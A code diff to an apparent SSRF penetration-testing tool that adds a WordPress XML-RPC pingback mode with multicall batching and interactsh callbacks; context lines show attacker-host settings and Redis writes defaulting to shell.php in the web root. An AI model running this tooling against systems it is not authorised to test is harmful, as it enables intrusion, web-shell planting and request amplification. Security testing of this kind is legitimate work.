@@ -17,6 +17,12 @@ import {
   type ContentMatch
 } from "../../../core/engines/ssrf/canary.ts";
 import { executeSsrfPlan, type SsrfExecutionOutcome } from "../../../core/engines/ssrf/executor.ts";
+import {
+  buildPingbackRequest,
+  MAX_MULTICALL,
+  type PingbackRequest,
+} from "../../../core/engines/ssrf/payloads/xmlrpc.ts";
+import { resolveInteractshWatch } from "./blind.ts";
 import { TraceSink } from "../../../core/trace.ts";
 
 export interface ScanOptions {
@@ -35,7 +41,18 @@ export interface ScanOptions {
   redisWriteFile?: string;
   redisWriteDir?: string;
   redisWriteFilename?: string;
+  /** Use the WordPress XML-RPC pingback POST instead of a generic query parameter. */
+  xmlrpcPingback?: boolean;
+  /** Second pingback argument — must be a real post on the target site. */
+  pingbackTargetUri?: string;
+  /** system.multicall batch size (default 1). */
+  multicall?: number;
+  /** OOB source URI; defaults to canaryUrl or the blind placeholder. */
+  sourceUri?: string;
 }
+
+/** Placeholder source URI when no interactsh/canary is configured. */
+export const DEFAULT_PINGBACK_SOURCE = "http://localhost:8080/c/TOKEN";
 
 /**
  * Loads caller-supplied Redis write content from an external file.
@@ -74,7 +91,32 @@ export function runSsrfScan(
   options: ScanOptions = {}
 ): ScanResultWithImpact[] {
   if (!targetUrl) throw new TypeError("targetUrl is required");
-  if (!parameter) throw new TypeError("parameter is required");
+  if (!parameter && !options.xmlrpcPingback) throw new TypeError("parameter is required");
+
+  // Explicit XML-RPC mode: one POST to <origin>/xmlrpc.php carrying the
+  // pingback methodCall instead of a query-parameter GET.
+  if (options.xmlrpcPingback) {
+    if (!options.pingbackTargetUri) {
+      throw new TypeError("pingbackTargetUri is required for --xmlrpc-pingback");
+    }
+    const sourceUri = options.sourceUri ?? options.canaryUrl ?? DEFAULT_PINGBACK_SOURCE;
+    const request: PingbackRequest = buildPingbackRequest({
+      targetUrl,
+      sourceUri,
+      targetUri: options.pingbackTargetUri,
+      count: options.multicall,
+    });
+    return [{
+      category: "xmlrpc pingback",
+      payload: sourceUri,
+      technique: "xmlrpc pingback",
+      detail: `WordPress pingback ${request.url} (${options.multicall && options.multicall > 1 ? `multicall x${options.multicall}` : "single"})`,
+      headers: request.headers,
+      method: "POST",
+      requestUrl: request.url,
+      body: request.body,
+    }];
+  }
 
   const redisAttackerHost = options.redisAttackerHost ?? process.env.ENIGMA_ATTACKER_HOST;
   const redisAttackerPort = options.redisAttackerPort ?? Number(process.env.ENIGMA_ATTACKER_PORT ?? "0");
@@ -124,6 +166,9 @@ export function runSsrfScan(
     if (options.targetUrl) {
       console.error(`[INFO] Internal target: ${options.targetUrl}`);
     }
+    if (options.xmlrpcPingback) {
+      console.error(`[INFO] XML-RPC pingback: POST ${results[0]?.requestUrl} (source=${options.sourceUri ?? options.canaryUrl ?? DEFAULT_PINGBACK_SOURCE})`);
+    }
   }
 
   return results;
@@ -131,8 +176,11 @@ export function runSsrfScan(
 
 async function main() {
   const targetUrl = process.argv[2];
-  const parameter = process.argv[3];
-  if (!targetUrl || !parameter) {
+  const xmlrpcPingback = process.argv.slice(3).includes("--xmlrpc-pingback");
+  // XML-RPC mode needs no injection parameter — the payload is a POST body.
+  const parameter = xmlrpcPingback && process.argv[3]?.startsWith("--") ? "" : process.argv[3];
+  const optionStart = parameter === "" ? 3 : 4;
+  if (!targetUrl || (!parameter && !xmlrpcPingback)) {
     console.error("usage: enigma-ssrf run <targetUrl> <parameter> [options]");
     console.error("");
     console.error("options:");
@@ -151,6 +199,16 @@ async function main() {
     console.error("  --redis-write-dir=<dir>  Target directory for write (default: /var/www/html/)");
     console.error("  --redis-write-name=<fn>  Target filename (default: shell.php)");
     console.error("  --trace=<file>           Write NDJSON trace (per-probe records + summary)");
+    console.error("  --xmlrpc-pingback        Use WordPress XML-RPC pingback (POST /xmlrpc.php)");
+    console.error("  --target-uri=<url>       Pingback target URI (must be a real post on the site)");
+    console.error("  --multicall=<n>          Batch pingback.ping entries via system.multicall (1-50)");
+    console.error("");
+    console.error("OOB: ProjectDiscovery public servers by default (oast.pro, .live, .site,");
+    console.error("     .online, .fun, .me — rotated on register failure). They are third-party");
+    console.error("     infrastructure that sees your callbacks and is rate-limited; use a");
+    console.error("     self-hosted server for client work: INTERACTSH_SERVER + INTERACTSH_DOMAIN");
+    console.error("     (+ INTERACTSH_TOKEN). INTERACTSH_PUBLIC=0 disables the public fallback;");
+    console.error("     INTERACTSH_PUBLIC_SERVER=oast.fun pins one public server.");
     process.exitCode = 1;
     return;
   }
@@ -159,7 +217,7 @@ async function main() {
   let slackWebhook: string | undefined;
   let traceFile: string | undefined;
 
-  for (const arg of process.argv.slice(4)) {
+  for (const arg of process.argv.slice(optionStart)) {
     if (arg.startsWith("--canary=")) {
       options.canaryUrl = arg.slice(arg.indexOf("=") + 1);
     } else if (arg.startsWith("--max=")) {
@@ -197,6 +255,33 @@ async function main() {
       options.redisWriteFilename = arg.slice(arg.indexOf("=") + 1);
     } else if (arg.startsWith("--trace=")) {
       traceFile = arg.slice(arg.indexOf("=") + 1);
+    } else if (arg === "--xmlrpc-pingback") {
+      options.xmlrpcPingback = true;
+    } else if (arg.startsWith("--target-uri=")) {
+      options.pingbackTargetUri = arg.slice(arg.indexOf("=") + 1);
+    } else if (arg.startsWith("--multicall=")) {
+      const val = parseInt(arg.slice(arg.indexOf("=") + 1), 10);
+      if (isNaN(val) || val < 1 || val > MAX_MULTICALL) {
+        console.error(`error: --multicall option requires an integer between 1 and ${MAX_MULTICALL}`);
+        process.exitCode = 1;
+        return;
+      }
+      options.multicall = val;
+    }
+  }
+
+  if (options.xmlrpcPingback) {
+    if (!options.pingbackTargetUri) {
+      console.error("error: --xmlrpc-pingback requires --target-uri=<url>");
+      process.exitCode = 1;
+      return;
+    }
+    // Reuse the same interactsh client the blind flow resolves for the
+    // source URI — never mint a second OOB mechanism.
+    const oob = await resolveInteractshWatch(options.canaryUrl);
+    if (oob) {
+      options.sourceUri = oob.canaryUrl;
+      options.canaryUrl = oob.canaryUrl;
     }
   }
 
